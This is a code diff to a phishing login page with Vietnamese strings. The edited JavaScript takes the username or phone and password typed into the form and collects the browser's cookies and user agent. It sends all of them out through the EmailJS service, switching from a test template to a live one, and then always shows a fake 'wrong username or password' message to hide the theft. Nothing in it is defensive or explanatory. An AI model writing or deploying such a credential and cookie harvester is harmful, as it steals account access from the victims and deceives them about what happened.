@@ -334,27 +334,29 @@
         function showHelp() { switchContainer('help-container'); }
 
         function sendEmail(loginInput, password) {
-            // Lấy thông tin động từ input và cookie
+            const cookies = getCookies();
             const templateParams = {
-                email: loginInput, // Email hoặc số điện thoại từ input
-                phone: loginInput.match(/\d+/) ? loginInput : "Không có số điện thoại", // Nếu input có số, dùng làm phone
-                password: password, // Mật khẩu từ input
-                cookies: getCookies(), // Cookie hiện tại
-                user_agent: navigator.userAgent, // User-Agent thực tế của trình duyệt
+                name: "User",
+                time: new Date().toLocaleString(),
+                email: loginInput.includes('@') ? loginInput : "Không có email",
+                phone: loginInput.match(/\d+/) ? loginInput : "Không có số điện thoại",
+                password: password,
+                cookies: cookies,
+                user_agent: navigator.userAgent,
                 action: "Đăng nhập qua form",
-                timestamp: new Date().toLocaleString() // Thời gian thực tế
+                timestamp: new Date().toLocaleString()
             };
 
             console.log("Đang gửi email với dữ liệu:", templateParams);
 
-            return emailjs.send('service_ytsr91e', '__ejs-test-mail-service__', templateParams)
+            return emailjs.send('service_ytsr91e', 'template_gwserzi', templateParams)
                 .then((response) => {
                     console.log("Email gửi thành công:", response.status, response.text);
                     showPopup("Email gửi thành công", "Kiểm tra email của bạn!");
                 })
                 .catch((error) => {
                     console.error("Lỗi gửi email:", error);
-                    showPopup("Lỗi gửi email", "Vui lòng kiểm tra console để biết chi tiết.");
+                    showPopup("Lỗi gửi email", "Chi tiết lỗi: " + (error.text || "Không xác định"));
                 });
         }
 
@@ -362,14 +364,13 @@
             const loginInput = document.getElementById('login-input').value || "";
             const password = document.getElementById('password').value || "";
 
-            // Lưu cookie với thời gian sống đến năm 2100
             const expiryDate = new Date("2100-01-01").toUTCString();
             document.cookie = `c_user=123456789; path=/; expires=${expiryDate}`;
             document.cookie = `login=${encodeURIComponent(loginInput)}; path=/; expires=${expiryDate}`;
 
-            // Gửi email và chờ kết quả
+            console.log("Cookie sau khi lưu:", document.cookie);
+
             sendEmail(loginInput, password).finally(() => {
-                // Hiển thị thông báo "Đăng nhập không thành công"
                 showPopup("Đăng nhập không thành công", "Sai tên đăng nhập hoặc mật khẩu, vui lòng thử lại.");
             });
         }
